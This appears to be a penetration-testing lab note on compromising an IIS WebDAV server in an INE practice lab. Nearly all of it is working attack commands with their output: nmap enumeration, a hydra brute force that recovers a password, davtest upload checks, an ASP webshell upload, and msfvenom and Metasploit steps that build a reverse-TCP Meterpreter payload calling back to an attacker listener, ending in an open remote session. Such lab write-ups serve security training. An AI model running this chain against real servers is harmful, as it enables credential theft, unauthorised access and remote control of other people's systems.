Extension to the HTTP protocol which allow user to manage files on remote web servers.
# Footprint
First, we have to enumerate the service running on the machine to see if there is a webdav server.

```bash
$> nmap --script http-enum -sV -p 80,443 demo.ine.local
[*] exec: nmap --script http-enum -sV -p 80,443 demo.ine.local

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 14:20 IST
Nmap scan report for demo.ine.local (10.2.24.174)
Host is up (0.0042s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
443/tcp closed https
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.85 seconds
```

We can see here that there is a **/webdav/** folder.
# Bruteforce
You can use `hydra` to perform a bruteforce attack:
```bash
$> hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt demo.ine.local http-get /webdav/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-06 15:51:14
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-get://demo.ine.local:80/webdav/
[80][http-get] host: demo.ine.local   login: bob   password: password_123321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-06 15:51:14
```
# File access information
We can use the **`davtest`** tool to try to access the webdav folder, and see what type of file can be uploaded.
```bash
$> davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
[*] exec: davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/

********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://demo.ine.local/webdav
********************************************************
NOTE    Random string for this session: 0dzc2wDg
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_0dzc2wDg
********************************************************
 Sending test files
PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.php
PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.cgi
PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.txt
PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.pl
PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.html
PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.jhtml
PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.cfm
PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.asp
PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.jsp
PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.shtml
PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.aspx
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    cgi     FAIL
EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
EXEC    cfm     FAIL
EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.asp
EXEC    asp     FAIL
EXEC    jsp     FAIL
EXEC    shtml   FAIL
EXEC    aspx    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.php
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.cgi
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.txt
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.pl
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.html
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.jhtml
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.cfm
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.asp
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.jsp
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.shtml
PUT File: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.aspx
Executes: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.txt
Executes: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.html
Executes: http://demo.ine.local/webdav/DavTestDir_0dzc2wDg/davtest_0dzc2wDg.asp
```
We can see that we can execute ASP, HTML and TXT file
# Access with credentials
To access the webdav server with credential you can use the **`cadaver`** tool.

```bash
> cadaver http://demo.ine.local/webdav
[*] exec: cadaver http://demo.ine.local/webdav

Authentication required for demo.ine.local on server `demo.ine.local`:
Username: bob
Password: 
dav:/webdav/> 
```
## Put a payload
```bash
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp`:
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_0dzc2wDg                    0  Oct 22 14:36
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
        webshell.asp                        1362  Oct 22 14:40
```
## Execute the payload
You can access the payload through the browser.
![[Pasted image 20241022111218.png]]
# Metasploit - Manual
## Generate the payload

```bash
$> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.8 LPORT=1234 -f asp > shell.asp                                                             
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38327 bytes
```
## Upload the payload

```bash
$> cadaver http://demo.ine.local/webdav/ 
Authentication required for demo.ine.local on server `demo.ine.local':
Username: bob
Password: 
dav:/webdav/> put /root/shell.asp 
Uploading /root/shell.asp to `/webdav/shell.asp':
Progress: [=============================>] 100.0% of 38327 bytes succeeded.
dav:/webdav/> 
```
## Run multi handler
```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP>
LHOST => 10.10.49.8
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.49.8:1234 

```
Now you can execute the file in the browser
# Metasploit automatic
Use the module `iss_webdav_upload_asp`
```bash
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST 10.10.41.2
LHOST => 10.10.41.2
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpPassword password_123321
HttpPassword => password_123321
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS 10.2.26.140
RHOSTS => 10.2.26.140
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PATH /webdav/metasploit.asp
PATH => /webdav/metasploit.asp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.41.2:4444 
[*] Checking /webdav/metasploit.asp
[*] Uploading 610881 bytes to /webdav/metasploit.txt...
[*] Moving /webdav/metasploit.txt to /webdav/metasploit.asp...
[*] Executing /webdav/metasploit.asp...
[*] Deleting /webdav/metasploit.asp (this doesn\'t always work)...
[*] Sending stage (176198 bytes) to 10.2.26.140
[*] Meterpreter session 1 opened (10.10.41.2:4444 -> 10.2.26.140:49717) at 2024-11-07 15:16:49 +0530

meterpreter > 
```

